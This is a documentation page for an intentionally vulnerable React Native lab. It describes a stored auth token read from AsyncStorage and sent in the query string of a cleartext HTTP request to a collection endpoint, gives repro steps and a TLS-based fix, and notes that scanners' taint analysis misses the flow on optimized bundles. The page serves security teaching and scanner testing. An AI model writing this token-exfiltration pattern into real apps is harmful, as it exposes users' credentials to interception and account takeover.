# Secret exfil to cleartext (`m5_secret_exfil`)
- **OWASP:** M5 (Insecure Communication)  ·  **MASVS:** MASVS-NETWORK  ·  **MASTG:** Network Communication  ·  **Detection:** needs-dataflow (secret → cleartext-sink dataflow needs interprocedural taint — often missed on optimized Hermes/Metro bundles)

> **How it's detected:** the endpoint's cleartext *posture* is easy to flag (the
> same manifest/NSC + `http://` signals as [`m5_cleartext_http`](m5_cleartext_http.md)),
> but the **secret → cleartext-sink dataflow** is the hard part: it needs
> interprocedural taint from the `AsyncStorage.getItem('@auth_token')` source to the
> `fetch(http://…?t=token)` sink. On an **optimized Hermes/Metro release bundle** the
> source is routed through the `@react-native-async-storage` wrapper class and an
> `async/await` transform, so taint that was validated on unoptimized bundles can
> return **zero flows** here even though the flow is unmistakably present in source.
> **This lab is a clean reproduction of that gap** — see the notes in
> [`detection.md`](../detection.md).

## What
The stored auth token is read from `AsyncStorage` and sent as a query parameter to
a **cleartext HTTP** endpoint (`http://10.0.2.2:8080/collect?t=<token>`). The secret
travels unencrypted and lands in server/proxy logs.

## Where
`src/labs/m5_secret_exfil/index.tsx` — the `// DIRNA-VULN:m5_secret_exfil` line(s)
(`AsyncStorage.getItem('@auth_token')` → `fetch(`${CLEARTEXT_HOST}/collect?t=` + token)`,
where `CLEARTEXT_HOST = 'http://10.0.2.2:8080'`).

## Proof / repro
- **Static:** a taint engine *should* flow a secret-shaped source
  (`getItem('@auth_token')`) into a network sink (`fetch(http://…)`), and the sink
  is cleartext — both halves of the finding. In practice many scanners' RN taint
  tiers return 0 flows on a real optimized Metro bundle (the gap above); only the
  cleartext posture of the sink is reported.
- **Dynamic:** run `m1_asyncstorage_token` first to populate `@auth_token`, then
  open this lab and tap **Run this lab**. On the wire (`http`, port 8080) the token
  is visible to any on-path observer.

## Impact
The token is disclosed to the network and any intermediary (Wi-Fi AP, ISP, proxy)
and copied into request logs — a passive attacker harvests it and takes over the
account.

## Fix
```ts
// Don't exfiltrate secrets; if you must call out, use TLS and keep tokens in headers, not URLs.
const token = await Keychain.getGenericPassword();
await fetch('https://analytics.example.com/collect', {
  method: 'POST',
  headers: { Authorization: `Bearer ${token}` }, // TLS-encrypted, not logged in query strings
  body: JSON.stringify({ event: 'app_open' }),   // never send the credential itself as data
});
```
